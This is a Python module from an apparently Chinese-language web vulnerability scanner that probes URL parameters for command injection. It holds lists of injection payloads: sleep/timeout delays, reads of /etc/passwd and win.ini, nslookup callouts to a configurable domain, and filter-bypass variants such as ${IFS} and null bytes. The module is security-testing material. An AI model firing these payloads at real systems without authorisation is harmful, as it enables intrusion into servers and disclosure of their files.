"""WVS v18 - 命令注入检测模块

独立的命令注入检测器：
1. 多种注入语法：; | & ` $() newline
2. 时间盲注：通过延迟判断命令执行
3. 外带检测：通过 DNS/HTTP 请求验证命令执行
4. 多平台支持：Unix/Linux + Windows
"""
import asyncio
import re
import time
import secrets
import string
import socket
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote


@dataclass
class CommandInjectionVuln:
    """命令注入漏洞"""
    url: str
    parameter: str
    method: str
    payload: str
    injection_type: str      # time-based, dns-oob, http-oob, reflected
    severity: str
    confidence: float
    evidence: str
    platform: str            # unix, windows, unknown


class CommandInjectionScanner:
    """命令注入检测器"""

    # 时间盲注 payload（sleep 3秒）
    TIME_BASED_PAYLOADS = [
        # Unix/Linux
        ("; sleep 3", "unix", "semicolon"),
        ("| sleep 3", "unix", "pipe"),
        ("&& sleep 3", "unix", "and"),
        ("|| sleep 3", "unix", "or"),
        ("`sleep 3`", "unix", "backtick"),
        ("$(sleep 3)", "unix", "subshell"),
        ("\nsleep 3", "unix", "newline"),
        ("; /bin/sleep 3", "unix", "semicolon-full"),
        ("|/bin/sleep 3", "unix", "pipe-full"),

        # Windows
        ("& timeout /t 3", "windows", "ampersand"),
        ("| timeout /t 3", "windows", "pipe"),
        ("&& timeout /t 3", "windows", "and"),
        ("|| timeout /t 3", "windows", "or"),
        ("\ntimeout /t 3", "windows", "newline"),

        # 通用（ping 延迟）
        ("; ping -c 3 127.0.0.1", "unix", "ping-unix"),
        ("| ping -n 3 127.0.0.1", "windows", "ping-win"),
    ]

    # 回显检测 payload（通过输出特征判断）
    REFLECTED_PAYLOADS = [
        # Unix/Linux
        ("; id", "uid=\\d+", "unix", "id command"),
        ("| id", "uid=\\d+", "unix", "id pipe"),
        ("`id`", "uid=\\d+", "unix", "id backtick"),
        ("$(id)", "uid=\\d+", "unix", "id subshell"),
        ("; whoami", "(root|www-data|apache|daemon|mysql|nobody|nginx)", "unix", "whoami"),
        ("| uname -a", "Linux|Darwin|FreeBSD", "unix", "uname"),
        ("; cat /etc/passwd", "root:.*:/bin/", "unix", "passwd file"),
        ("; ls -la", "total \\d+|drwx|lrwx|-rw", "unix", "ls output"),

        # Windows
        ("& whoami", "\\w+\\\\\\w+|\\w+", "windows", "whoami-win"),
        ("| whoami", "\\w+\\\\\\w+|\\w+", "windows", "whoami-pipe"),
        ("& dir", "Directory of|<DIR>", "windows", "dir output"),
        ("| type C:\\\\Windows\\\\win.ini", "\\[fonts\\]|\\[extensions\\]", "windows", "win.ini"),
    ]

    # DNS 外带 payload（需要外部 DNS 服务器）
    DNS_OOB_PAYLOADS = [
        # 格式：(payload_template, platform, description)
        # 占位符 {DOMAIN} 会在运行时替换
        ("; nslookup {DOMAIN}", "unix", "nslookup"),
        ("| nslookup {DOMAIN}", "unix", "nslookup-pipe"),
        ("; dig {DOMAIN}", "unix", "dig"),
        ("; host {DOMAIN}", "unix", "host"),
        ("; ping -c 1 {DOMAIN}", "unix", "ping"),
        ("$(nslookup {DOMAIN})", "unix", "subshell-nslookup"),

        ("& nslookup {DOMAIN}", "windows", "nslookup-win"),
        ("| nslookup {DOMAIN}", "windows", "nslookup-win-pipe"),
    ]

    # 常见命令注入分隔符
    SEPARATORS = [";", "|", "&", "&&", "||", "`", "$(", "\n", "\r\n"]

    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 15)
        self.delay_threshold = self.config.get("delay_threshold", 2.5)
        self.oob_domain = self.config.get("oob_domain", "")  # 外带域名
        self.oob_token = self.config.get("oob_token", "")
        self.session = None
        self.session_cookies = {}
        self.session_headers = {}

    def set_auth(self, cookies: Dict = None, headers: Dict = None):
        if cookies:
            self.session_cookies.update(cookies)
        if headers:
            self.session_headers.update(headers)

    async def _send_request(self, url: str, method: str = "GET",
                           params: Dict = None, data: Dict = None) -> Tuple[int, str, float]:
        """发送请求，返回 (状态码, 响应内容, 耗时)"""
        import aiohttp

        start = time.time()
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                **self.session_headers
            }

            if method.upper() == "GET":
                async with self.session.get(url, params=params, cookies=self.session_cookies,
                                           headers=headers, timeout=self.timeout) as resp:
                    content = await resp.text()
                    status = resp.status
            else:
                async with self.session.request(method, url, params=params, data=data,
                                               cookies=self.session_cookies, headers=headers,
                                               timeout=self.timeout) as resp:
                    content = await resp.text()
                    status = resp.status

            duration = time.time() - start
            return status, content, duration

        except asyncio.TimeoutError:
            return 408, "", self.timeout
        except Exception as e:
            return 0, str(e), 0

    async def test_time_based(self, url: str, param: str, method: str = "GET",
                              baseline_duration: float = 0) -> List[CommandInjectionVuln]:
        """
        时间盲注检测

        原理：注入 sleep/timeout 命令，如果响应时间明显延长，说明命令被执行
        """
        vulns = []

        for payload, platform, desc in self.TIME_BASED_PAYLOADS:
            # 构造请求
            if method.upper() == "GET":
                test_params = {param: payload}
                status, content, duration = await self._send_request(url, "GET", params=test_params)
            else:
                test_data = {param: payload}
                status, content, duration = await self._send_request(url, "POST", data=test_data)

            # 检查延迟
            if duration >= self.delay_threshold:
                # 二次确认（避免网络波动）
                await asyncio.sleep(0.5)
                if method.upper() == "GET":
                    _, _, duration2 = await self._send_request(url, "GET", params=test_params)
                else:
                    _, _, duration2 = await self._send_request(url, "POST", data=test_data)

                if duration2 >= self.delay_threshold:
                    vulns.append(CommandInjectionVuln(
                        url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        injection_type="time-based",
                        severity="critical",
                        confidence=0.9,
                        evidence=f"Response delayed {duration:.2f}s and {duration2:.2f}s (threshold: {self.delay_threshold}s)",
                        platform=platform
                    ))
                    break

        return vulns

    async def test_reflected(self, url: str, param: str, method: str = "GET",
                            baseline_content: str = "") -> List[CommandInjectionVuln]:
        """
        回显检测

        原理：注入命令后检查响应中是否包含命令输出特征
        """
        vulns = []

        for payload, pattern, platform, desc in self.REFLECTED_PAYLOADS:
            if method.upper() == "GET":
                test_params = {param: payload}
                status, content, duration = await self._send_request(url, "GET", params=test_params)
            else:
                test_data = {param: payload}
                status, content, duration = await self._send_request(url, "POST", data=test_data)

            # 检查命令输出特征
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                # 确认不是基线响应就有的
                baseline_match = re.search(pattern, baseline_content, re.IGNORECASE)
                if not baseline_match:
                    vulns.append(CommandInjectionVuln(
                        url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        injection_type="reflected",
                        severity="critical",
                        confidence=0.95,
                        evidence=f"Command output detected: '{match.group(0)}'",
                        platform=platform
                    ))
                    break

        return vulns

    async def test_dns_oob(self, url: str, param: str, method: str = "GET") -> List[CommandInjectionVuln]:
        """
        DNS 外带检测

        原理：注入 nslookup/dig 命令指向攻击者控制的 DNS 服务器，
             如果收到 DNS 查询，说明命令被执行

        需要：
        - 配置 oob_domain（如：attacker.com）
        - 或使用 Burp Collaborator / interactsh 等服务
        """
        vulns = []

        if not self.oob_domain:
            return vulns  # 未配置外带域名，跳过

        # 生成唯一 token
        token = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(8))
        full_domain = f"{token}.{self.oob_domain}"

        for payload_template, platform, desc in self.DNS_OOB_PAYLOADS:
            payload = payload_template.format(DOMAIN=full_domain)

            if method.upper() == "GET":
                test_params = {param: payload}
                await self._send_request(url, "GET", params=test_params)
            else:
                test_data = {param: payload}
                await self._send_request(url, "POST", data=test_data)

            # 等待 DNS 查询（需要外部检查 DNS 服务器日志）
            await asyncio.sleep(1)

            # 注：实际的 DNS 查询验证需要外部服务支持
            # 这里只记录 payload，需要人工确认或集成 interactsh 等

        return vulns

    async def test_all(self, session, url: str, param: str, method: str = "GET",
                      baseline_content: str = "", baseline_duration: float = 0) -> List[CommandInjectionVuln]:
        """
        完整测试流程

        1. 先测试回显型（快速）
        2. 再测试时间盲注（较慢）
        3. 最后测试外带（需要配置）
        """
        self.session = session
        vulns = []

        # 1. 回显检测
        reflected_vulns = await self.test_reflected(url, param, method, baseline_content)
        vulns.extend(reflected_vulns)

        if vulns:
            return vulns  # 已确认，无需继续

        # 2. 时间盲注
        time_vulns = await self.test_time_based(url, param, method, baseline_duration)
        vulns.extend(time_vulns)

        if vulns:
            return vulns

        # 3. DNS 外带（可选）
        if self.oob_domain:
            dns_vulns = await self.test_dns_oob(url, param, method)
            vulns.extend(dns_vulns)

        return vulns

    def generate_bypass_payloads(self, base_payload: str) -> List[str]:
        """
        生成绕过变体

        常见绕过技术：
        - 大小写混合
        - 空字节截断
        - 编码绕过
        - 空格替代
        """
        variants = [base_payload]

        # 大小写混合
        mixed = ''.join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(base_payload)
        )
        variants.append(mixed)

        # 空格替代
        space_variants = [
            base_payload.replace(" ", "${IFS}"),
            base_payload.replace(" ", "$IFS$9"),
            base_payload.replace(" ", "%09"),  # Tab
            base_payload.replace(" ", "{,}"),
        ]
        variants.extend(space_variants)

        # 编码
        variants.append(quote(base_payload))

        # 空字节截断（某些 PHP 版本）
        if ";" in base_payload:
            variants.append(base_payload.replace(";", ";%00"))

        return list(set(variants))
